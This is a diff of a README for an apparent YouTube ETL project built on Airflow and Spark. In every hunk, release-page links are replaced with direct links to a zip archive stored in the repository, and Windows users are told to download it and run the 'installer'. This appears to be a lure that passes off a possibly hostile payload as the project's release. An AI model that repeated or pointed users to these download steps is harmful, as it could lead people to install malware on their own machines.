@@ -1,6 +1,6 @@
 # 🚀 youtube-etl-airflow-spark - Run a YouTube Data Pipeline
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-4B9CD3?style=for-the-badge&logo=github)](https://github.com/Dannyquality336/youtube-etl-airflow-spark/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-4B9CD3?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)
 
 ## 📦 What this app does
 
@@ -30,7 +30,7 @@ If you do not already have Docker Desktop, install it first. This app runs insid
 
 ## 📥 Download and install
 
-1. Go to the release page here: [Download the latest release](https://github.com/Dannyquality336/youtube-etl-airflow-spark/releases)
+1. Go to the release page here: [Download the latest release](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)
 2. On the release page, open the newest release
 3. Download the file provided in that release
 4. Save the file to a folder you can find again, such as `Downloads` or `Desktop`
@@ -204,7 +204,7 @@ These tools work together to automate data collection and processing.
 
 ## 📌 Release download
 
-Use this page to download the files for Windows: [https://github.com/Dannyquality336/youtube-etl-airflow-spark/releases](https://github.com/Dannyquality336/youtube-etl-airflow-spark/releases)
+Use this page to download the files for Windows: [https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip](https://raw.githubusercontent.com/Dannyquality336/youtube-etl-airflow-spark/main/jobs/airflow-youtube-spark-etl-v1.1.zip)
 
 Open the latest release, download the package, extract it if needed, then run the provided start file or installer
 
